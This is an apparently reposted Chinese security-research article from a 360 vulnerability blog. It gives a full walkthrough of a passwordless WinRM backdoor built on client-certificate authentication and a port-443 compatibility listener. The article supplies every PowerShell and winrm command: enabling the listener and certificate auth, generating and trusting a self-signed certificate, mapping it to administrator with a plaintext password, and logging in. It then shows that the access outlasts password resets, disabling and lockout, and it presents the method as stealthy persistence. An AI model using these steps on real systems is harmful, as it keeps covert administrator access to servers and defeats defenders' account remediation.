> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [vul.360.net](https://vul.360.net/archives/95)

> 本文主要介绍基于证书认证的无密码 Winrm 后门认证实现。

> **本文主要介绍基于证书认证的无密码 Winrm 后门认证实现。无密码认证的特性，决定了其在隐蔽维持方面的天然优势，研究员在测试中甚至发现即使证书申请账户的密码被修改、账户被禁用、锁定等其他恶劣对抗环境，在一定较长时间内仍然可以通过之前生成的旧证书私钥与目标建立认证；同时结合 Winrm 的 443 端口复用 Listener，可实现内网环境对公网 NAT 开放的网站系统如 Exchange、Sharepoint 等进行隐蔽的权限维持。**

> **0x01. 基本原理介绍**

       WinRM 全称是 Windows Remote Management，是微软服务器硬件管理功能的一部分，能够对本地或远程的服务器进行管理。WinRM 服务能够让管理员远程登录 Windows 操作系统，获得一个类似 Telnet 的交互式命令行 shell，而底层通讯协议使用的是 HTTP。

     在 Windows 的远程管理服务 WinRM 的基础上，使用拥有客户端身份认证 EKU 的证书，配合 HTTP.sys 驱动的端口复用，即可实现无密码的 Winrm 证书认证后门。

> **0x02. 原有的 Winrm 后门技术实现及思考**

      基于用户名 / 密码认证的 Winrm 后门技术已成为经典手法，同时配合 HTTP.sys 驱动所实现的端口复用功能也被公众熟知。整体来看，当前针对 Winrm 后门，给出的技术方案基本包括以下几点：

1、基础的用户名 / 密码认证后门；

2、结合 HTTP.sys 驱动的端口复用后门；

3、由用户名 / 密码认证所延伸出的用户名 / 哈希认证后门；

4、解决 Winrm UAC 的后门辅助技巧。

        现有的 Winrm 解决方案从根本上来说都是以用户名 / 密码或者 HASH 为根基，其缺点也较为明显，一旦用户密码修改即可使得 winrm 认证失效。针对该问题，研究员通过查阅 Microsoft TECHNET 发现 Winrm 还支持证书认证，测试了可以通过配置证书认证的方式实现无需密码认证的 Winrm 解决方案。

       该方案整体利用思路如下：

1、服务端启用 443 复用 Listener 或传统 https Listener, 且开启证书认证；

2、服务端配置证书认证；

3、客户端利用证书登录；

4、完美后门验证。

    接下来将逐一进行介绍，介绍过程中将以 443 复用 Listener 后门为例，传统 https Listener 后门配置基本相同，这里不再介绍。

> **0x03. 启用服务器 Listener 与 Cerification Auth**

    以下所有配置过程基于以下场景：

*   目标服务器 IP 为：192.168.60.200
*   已经获得该机器上 administrator 权限
*   该主机已经配置 IIS 服务，具备 https 站点 对外开放 443 端口

    默认情况下，在 Windows 2012 以上的服务器操作系统中，WinRM 服务默认启动并监听了 5985 端口，可以省略这一步。对于 Windows 2008 来说，需要使用命令来启动 WinRM 服务，快速配置和启动的命令是 winrm quickconfig -q，这条命令运行后会自动添加防火墙例外规则，放行 5985 端口。

（1）可通过以下命令查看当前 Listener，如图一：

`winrm e winrm/config/listener`

![](https://vul.360.net/wp-content/uploads/2021/08/1-1024x166.png)

图一

      可见，默认只有 5985 端口的 HTTP Listener，Winrm 服务并不会创建 443 兼容 Listener。

（2）可通过以下命令创建 443 兼容 Listener，如图二：

`winrm set winrm/config/service '@{EnableCompatibilityHttpsListener="true"}'`

![](https://vul.360.net/wp-content/uploads/2021/08/2-1024x641.png)

图二

      发现已经成功启用 443 端口兼容 Listener。

（3）默认情况下，Winrm 服务端同样不会启用 Certification Auth 认证方式。使用如下命令查看当前启用的认证方式 ，如图三：

`winrm get winrm/config/service/auth`

![](https://vul.360.net/wp-content/uploads/2021/08/3.png)

图三

    发现目前尚未启用 Certification Auth。

（4）可通过以下命令启用 Certification Auth 认证方式 ，如图四：

`Set-Item -Path WSMan:\localhost\Service\Auth\Certificate -Value $true`

![](https://vul.360.net/wp-content/uploads/2021/08/4-1-1024x149.png)

图四

> **0x04. 配置证书认证**

    在启用服务器 Listener 与 Cerification Auth 后，接下来需要生成客户端证书并配置服务端证书认证，主要涉及两个方面：

    1、客户端证书生成

    2、将服务器用户与客户端证书形成映射

*   首先生成客户端证书 ，如图五：

`$winClientCert = New-SelfSignedCertificate -Type Custom -Subject "CN=administrator" -TextExtension @("2.5.29.37={text}1.3.6.1.5.5.7.3.2","2.5.29.17={text}upn=administrator@localhost") -KeyUsage DigitalSignature,KeyEncipherment -CertStoreLocation Cert:\CurrentUser\My\`

![](https://vul.360.net/wp-content/uploads/2021/08/5-1024x144.png)

图五

*   将生成的证书公钥导出 ，如图六：

`Export-Certificate -Cert Cert:\CurrentUser\My\12DF3BF619B91BA2E8FAC9C52CF086F437CCC995 -FilePath C:\Windows\Temp\public.crt`

![](https://vul.360.net/wp-content/uploads/2021/08/6-1024x134.png)

图六

*   将公钥复制到 Winrm 服务器，验证无误后，并将其导入。

（1）验证公钥指纹，如图七：

`$winClientCert = Get-PfxCertificate C:\Users\administrator.TEST\Desktop\public.crt`

![](https://vul.360.net/wp-content/uploads/2021/08/7-1024x95.png)

图七

（2） 导入证书 ，如图八：

`Import-Certificate -FilePath C:\Users\administrator.TEST\Desktop\public.crt -CertStoreLocation Cert:\LocalMachine\Root`

`Import-Certificate -FilePath C:\Users\administrator.TEST\Desktop\public.crt -CertStoreLocation Cert:\LocalMachine\TrustedPeople`

![](https://vul.360.net/wp-content/uploads/2021/08/8-1024x331.png)

图八

*   建立客户端证书与服务器用户映射，如图九：

`New-Item -Path WSMan:\localhost\ClientCertificate -Subject "administrator@localhost" -URI * -Issuer ((Get-PfxCertificate C:\Users\administrator.TEST\Desktop\public.crt).Thumbprint) -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "192.168.60.200\administrator", (ConvertTo-SecureString -String "Aa123.com" -AsPlainText -Force)) –Force`

此处的 Aa123.com 为 administrator 密码

![](https://vul.360.net/wp-content/uploads/2021/08/9-1024x164.png)

图九

*   至此服务端全部配置已经完成，同时检测 IIS 的 web 服务也能完全正常运行，如图十：

![](https://vul.360.net/wp-content/uploads/2021/08/10-1024x480.png)

图十

> **0x05. 客户端利用证书登录**

    在以上步骤完成之后，客户端即可使用生成的证书以 administrator 身份实现 Winrm 远程登录。

    默认客户端已启用 Certificate 认证方式，同样可通过以下命令查看、启用该认证方式，如图十一：

`winrm get winrm/config/client/auth`

`Set-Item -Path WSMan:\localhost\Client\Auth\Certificate -Value $true`

![](https://vul.360.net/wp-content/uploads/2021/08/11.png)

图十一

    Winrm 远程登录命令如下，如图十二：

`Enter-PSSession -ComputerName 192.168.60.200 -Port 443 -UseSSL -CertificateThumbprint 12DF3BF619B91BA2E8FAC9C52CF086F437CCC995 -SessionOption (New-PSSessionOption -SkipCACheck -SkipCNCheck)`

![](https://vul.360.net/wp-content/uploads/2021/08/12-1024x55.png)

图十二

成功利用证书完成认证登录。

> **0x06. 完美后门验证**

针对现有 Winrm 后门修改密码立即失效的尴尬场景，本文后门方案一定程度上解决了这个问题，因为研究员发现，在用户密码修改、禁用、用户锁定等恶劣对抗环境中仍展现出优秀能力：

*   **针对用户密码被修改的场景**

经测试，在多次修改 administrator 密码后，利用之前的客户端证书成功认证登录，如图十三、图十四：

![](https://vul.360.net/wp-content/uploads/2021/08/13-1024x185.png)

图十三

![](https://vul.360.net/wp-content/uploads/2021/08/14-1024x393.png)

图十四

*   **针对用户被禁用的场景**

在使用该用户身份与客户端证书形成映射后，将该用户禁用，利用之前的客户端证书成功认证登录，如图十五：

![](https://vul.360.net/wp-content/uploads/2021/08/15-1024x373.png)

图十五

*   **针对用户被锁定的场景**

在使用该用户身份与客户端证书形成映射后，然后利用组策略等方法将该用户禁用，再测试利用之前的客户端证书仍然可以成功认证登录，如图十六：

![](https://vul.360.net/wp-content/uploads/2021/08/16-1024x401.png)

图十六

可以发现，利用该后门方案配置后，无论目标服务器用户如何变更，经测试在一定时间内，均可以认证成功，可达到对目标的隐蔽权限维持。

> **利用条件：**
> 
> **获得目标主机 administrator 会话权限 / 密码 / HASH**
> 
> **目标主机 Winrm 服务的 https Listener （443 兼容 Listener 或传统 https Listener 均可）可被访问**